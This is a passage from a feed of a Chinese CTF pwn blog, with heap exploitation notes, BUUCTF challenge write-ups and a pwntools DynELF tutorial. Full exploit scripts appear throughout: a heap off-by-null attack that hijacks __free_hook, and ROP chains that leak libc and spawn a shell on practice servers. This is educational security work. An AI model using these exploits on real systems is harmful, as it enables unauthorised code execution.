class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_sz, name, dscr_sz, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        bookID = <span class="built_in">int</span>(io.recvline()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        name = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        dscr = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        author = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bookID, name, dscr, author</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">author_name</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    enter_author_name(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by one to leak addr of book1</span></span><br><span class="line">enter_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;book1&#x27;</span>, <span class="string">b&#x27;64&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">book1_addr = unpack(author1[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak book1_addr:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;135168&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">gdb.attach(io)  </span><br><span class="line"><span class="comment"># construct fake book1 to leak addr of book2</span></span><br><span class="line">fakebook = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(book1_addr-<span class="number">0x50</span>) + pack(<span class="number">100</span>)</span><br><span class="line"> </span><br><span class="line">pad = cyclic(<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">payload1 = pad + fakebook</span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload1)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by null to point at fake book1</span></span><br><span class="line">change(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">mmap_addr = unpack(name1.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak mmap_addr:&quot;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"> </span><br><span class="line">libc_base = mmap_addr + <span class="number">0x22000</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"> </span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">fakebook = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(free_hook_addr) + pack(<span class="number">100</span>)</span><br><span class="line">payload2 = pad + fakebook</span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload2)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, pack(system_addr))</span><br><span class="line"> </span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="2018强网杯gambox"><a href="#2018强网杯gambox" class="headerlink" title="2018强网杯gambox"></a>2018强网杯gambox</h3><p><a href="https://www.freebuf.com/news/168064.html">CTF经验 | Off-By-One相关知识点浅析 - FreeBuf网络安全行业门户</a></p><h3 id="V-amp-N2020招新赛simpleheap"><a href="#V-amp-N2020招新赛simpleheap" class="headerlink" title="V&amp;N2020招新赛simpleheap"></a>V&amp;N2020招新赛simpleheap</h3><p><a href="https://zhuanlan.zhihu.com/p/371413926">快速入门堆溢出技巧(OFF BY ONE) - 知乎 (zhihu.com)</a></p><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>uaf 漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为 NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="line">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，<strong>获取下一 chunk 块</strong>地址的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to next physical malloc_chunk. */</span><br><span class="line">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></pre></td></tr></table></figure><p>即使用<strong>当前块指针加上当前块大小。</strong></p><p>在 ptmalloc 中，<strong>获取前一个 chunk</strong> 信息的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></pre></td></tr></table></figure><p>即通过 <strong>malloc_chunk-&gt;prev_size 获取前一块大小</strong>，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，<strong>判断当前 chunk 是否是 use</strong> 状态的操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define inuse(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即<strong>查看下一 chunk 的 prev_inuse 域</strong>，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。。</p>]]></content>
    
    
    <summary type="html">unlink、off-by-one、UAF、Chunk Extend and Overlapping</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题记录-2</title>
    <link href="https://ixout.github.io/posts/14188/"/>
    <id>https://ixout.github.io/posts/14188/</id>
    <published>2023-03-27T06:12:13.000Z</published>
    <updated>2023-03-30T00:36:49.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>保护开了got表不可写以及nx</p><p>ida查看</p><p>主体是<img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_220445.png" alt=""></p><p>向buf中读入了一个随机数</p><p>下面两个函数依次是</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_220426.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_220452.png" alt=""></p><p>这里有两个不大熟悉的函数,原型及功能分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncmp</span>(<span class="type">const</span> <span class="type">char</span> *str1,<span class="type">const</span> cahr *str2,<span class="type">size_t</span> n)</span><br><span class="line">将str1与str2比较,最多比较前n个字节</span><br><span class="line"><span class="built_in">sprintf</span>(<span class="type">char</span> *<span class="built_in">string</span>,<span class="type">char</span> *format,arg_list);</span><br><span class="line">将格式化字符串format打印并送入<span class="built_in">string</span>字符串,arg_list是参数列表</span><br></pre></td></tr></table></figure><p>可以看到最后一个函数的读入字节数由第二个函数的返回值决定,</p><p>细看第二个函数,将s与buf比较,s中存的是随机数,肯定猜不到,这里也没有办法能够泄露或改写它,那么只能令v1等于0,即比较0个字节是否相同,那必然是相等的,要使v1等于0,只要buf开头是\0就行了,最后返回的是buf第8个字节</p><p>之后这题没有后门函数也没有binsh,那就是libc泄露类题目</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p=remote()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(puts_plt)+p32(<span class="number">0x08048825</span>)+p32(puts_got))</span><br><span class="line">puts=u32(p.recv()[-<span class="number">5</span>:-<span class="number">1</span>])  <span class="comment">#调用的是puts会自动在输出末尾加上换行注意过滤，这里其实直接p.recv(4)就行了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()  <span class="comment">#搜索已加载的C标准库中/bin/sh字符串的内存地址，并使用.__next__()方法来检索在库中找到的该字符串的第一个内存地址。</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>离大谱,自己泄露出来的libc怎么也打不通,最后发现题目给了libc🤡</p><p>细心的可能发现了</p><p>main_addr=e.symbols[‘__libc_start_main’]</p><p>这一句根本没用上</p><p>因为找不到main的symbols</p><p>所以我本来是打算用__libc_start_main作第一次rop的返回地址,但可以发现后面我并没有使用它,因为这么做是打不通的,至于为什么</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_232747.png" alt=""></p><p><strong>__libc_start_main是需要参数的!!!!!!!!!!</strong></p><p>因为这个硬生生被卡住了半个小时</p><p>也算吃了个教训,以后<strong>返回地址不能用__libc_start_main</strong></p><p><u>(之所以我会这么做,是因为我记岔了,__libc_start_main是可以用来做被泄露的函数,但我记成可以做返回地址了)</u></p><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>与jarvisoj_level2一样只不过变成了64位，注意参数传递方式即可</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28252</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004006b3</span></span><br><span class="line">binsh=<span class="number">0x600A90</span></span><br><span class="line">system=<span class="number">0x400603</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>和上一题一模一样</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26832</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x601048</span></span><br><span class="line">system=<span class="number">0x4005E3</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">继续</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="buuctf" scheme="https://ixout.github.io/tags/buuctf/"/>
    
    <category term="刷题记录" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>pwn技巧-DynELF</title>
    <link href="https://ixout.github.io/posts/69471/"/>
    <id>https://ixout.github.io/posts/69471/</id>
    <published>2023-03-26T04:39:50.000Z</published>
    <updated>2023-03-26T13:24:44.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DynELF？"><a href="#DynELF？" class="headerlink" title="DynELF？"></a>DynELF？</h1><p>DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄漏函数的情况下，可以解析任意加载库的任意符号地址。</p><p><strong>其原理就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</strong></p><h2 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h2><p>DynELF泄露函数方法最方便的使用情况是程序中最好含有write函数且可以多次调用main函数，不然的话还是用LibcSearcher的方法泄露比较好</p><h1 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h1><h2 id="官方文档给的例子"><a href="#官方文档给的例子" class="headerlink" title="官方文档给的例子"></a>官方文档给的例子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span>, address, enhex(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p><strong>log.debug(“%#x =&gt; %s”, address, enhex(data or ‘’))解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log.debug是pwntools中的日志工具，%#x表示输出一个整数的十六进制表示（带有0x前缀），%s表示输出一个字符串。address是要输出的内存地址，data是该地址对应的数据（一个字符串），enhex是pwntools中的工具函数，用于将字符串转换为十六进制表示的字符串（每个字节用两个十六进制字符表示），与encode(&#x27;hex&#x27;)相似。</span><br><span class="line">整个输出结果类似于：[DEBUG] 0x12345678 =&gt; 6162636465666768</span><br><span class="line">(data or &#x27;&#x27;)的作用是，当data变量为空（None）或者为False时，返回一个空字符串&#x27;&#x27;，否则返回data本身。</span><br></pre></td></tr></table></figure><h2 id="一个更具体的例子"><a href="#一个更具体的例子" class="headerlink" title="一个更具体的例子"></a>一个更具体的例子</h2><p><strong>源代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulfun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    vulfun();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello,World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;elf&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">data = p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./elf&#x27;</span>)</span><br><span class="line">d=DynELF(leak, ptr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a018</span></span><br><span class="line">pppr = <span class="number">0x080484bd</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) <span class="comment">#这里藏了一个之前没注意过的知识点①</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" red><summary> ① </summary>              <div class='content'>              <p>上面的exp使用了一个pppr(其实就是pop-pop-pop-ret),作为read的返回地址,这个是很有必要的,鉴于32位下返回地址和参数的互通性(64位也会但一般都不会超过6个参数）,如果read后直接接需要的函数地址那么read的参数又会变为所需函数的返回地址和参数,这显然不是我们所希望的,于是通过pppr来<strong>重新划分函数栈</strong></p>              </div>            </details><h1 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       p.send(payload2leak_addr)</span><br><span class="line">       data = p.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span 